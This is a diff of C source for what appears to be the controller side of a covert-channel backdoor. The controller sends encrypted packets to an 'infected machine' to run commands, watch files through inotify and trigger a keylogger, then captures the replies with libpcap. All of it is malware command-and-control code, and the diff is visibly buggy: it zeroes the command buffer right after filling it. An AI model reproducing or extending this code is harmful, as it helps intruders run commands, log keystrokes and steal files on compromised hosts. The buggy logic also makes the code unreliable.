@@ -8,7 +8,6 @@
 
 static void print_usage(void) {
     puts ("Usage options: \n"
-            "\t--nic       -   network interface to use\n"
             "\t--target    -   target machine to attack\n"
             "\t--command   -   command to request from infected machine\n"
             "\t--local     -   your local ip\n"
@@ -18,7 +17,6 @@ static void print_usage(void) {
 }
 
 static struct option long_options[] = {
-    {"nic",       required_argument,  0,  0 },
     {"target",    required_argument,  0,  1 },
     {"command",   required_argument,  0,  2 },
     {"local",     required_argument,  0,  3 },
@@ -28,15 +26,12 @@ static struct option long_options[] = {
     {0,         0,                  0,  0 }
 };
 
-
-
 int main(int argc, char **argv){
     pthread_t inotify_thread;
     int arg;
-    char *nic;
     char targetip[BUFSIZ];
     char localip[BUFSIZ];
-    char data[BUFSIZ];
+    unsigned char data[BUFSIZ];
     char pcapfilter[BUFSIZ];
     char file[BUFSIZ];
     char directory[BUFSIZ];
@@ -59,33 +54,25 @@ int main(int argc, char **argv){
         }
 
         switch (arg) {
-            case 0:
-                /*strncpy(nic, optarg, BUFFERSIZE);
-                printf("Using NIC: %s\n", nic);*/
-                break;
             case 1:
                 strncpy(targetip, optarg, BUFSIZ);
-                //printf("Target ip %s\n", targetip);
                 break;
             case 2:
-                strncpy(data,optarg, BUFSIZ);
-                printf("Command %s\n", data);
+                if_command = true;
+                strncpy(data, (unsigned char*)optarg, BUFSIZ);
                 break;
             case 3:
                 strncpy(localip, optarg, BUFSIZ);
-                //printf("Local ip %s\n", localip);
                 break;
             case 4:
                 tcp = true;
                 break;
             case 5:
                 strncpy(directory, optarg, BUFSIZ);
-                printf("Directory: %s\n", directory);
                 if_directory = true;
                 break;
             case 6:
                 strncpy(file, optarg, BUFSIZ);
-                printf("File: %s\n", file);
                 if_file = true;
                 break;
             default: /*  '?' */
@@ -94,27 +81,7 @@ int main(int argc, char **argv){
         }
     }
 
-
-    //add command into buffer
-    //send buffer (tcp or udp)
-
-    //create filter (tcp/udp, command, ip, port)
-    //libpcap (tcp/udp, command)
-        //wait packets
-            //parse ip
-            //check port (tcp/udp)
-            //if correct port
-                //check key
-                    //print ip.id to results
-            //else
-                //drop packet
-
-    //return;
-
-
-
-
-
+    memset(data, 0, sizeof(data));
 
     //validate inotify directory and file
     if((if_directory && !if_file) || (!if_directory && if_file)) {
@@ -123,32 +90,29 @@ int main(int argc, char **argv){
         return 0;
     }
 
-    if(if_command) {
-        Filter = InitFilter(targetip,localip,false);
-        CreateFilter(Filter, pcapfilter,tcp);
-        printf("Filter: %s\n",pcapfilter);
-        if(tcp){
-            covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
-        } else {
-            covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
-        }
-
-        Packetcapture(pcapfilter,Filter,tcp);
-
-    } else if(if_directory && if_file) {    //INOTIFY
-        inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
-        strncpy(inotify_args->file, file, BUFSIZ);
-        strncpy(inotify_args->targetip, targetip, BUFSIZ);
-        strncpy(inotify_args->localip, localip, BUFSIZ);
-        strncpy(inotify_args->directory, directory, BUFSIZ);
-        inotify_args->tcp = tcp;
-        pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
-        pthread_join(inotify_thread, NULL);
-
-    } else if(if_keylogger) {
-
+    //send packet with COMMAND keys and encrypted data
+    if(if_command == true) {
+        covert_send(localip, targetip, UPORT, UPORT, data, COMMAND);
+    //send packet with INOTIFY keys and encrypted
+    } else if(if_file == true && if_directory == true) {
+        snprintf(data, BUFSIZ, "%s\n%s", directory, file);
+        printf("DEBUG: data: %s\n", data);
+        covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
+    //send packet with KEYLOGGER keys and encrypted
+    } else if (if_keylogger == true) {
+        covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
     }
 
+    //send EOT to tell the infected that we are ready to receive
+    covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+
+    //create filter (tcp/udp, command, ip, port)
+    Filter = InitFilter(targetip, localip, false, tcp);
+    CreateFilter(pcapfilter, tcp);
+    printf("Filter: %s\n",pcapfilter);
+
+    //libpcap (tcp/udp, command)
+    Packetcapture(pcapfilter,Filter);
 
     return 0;
 }
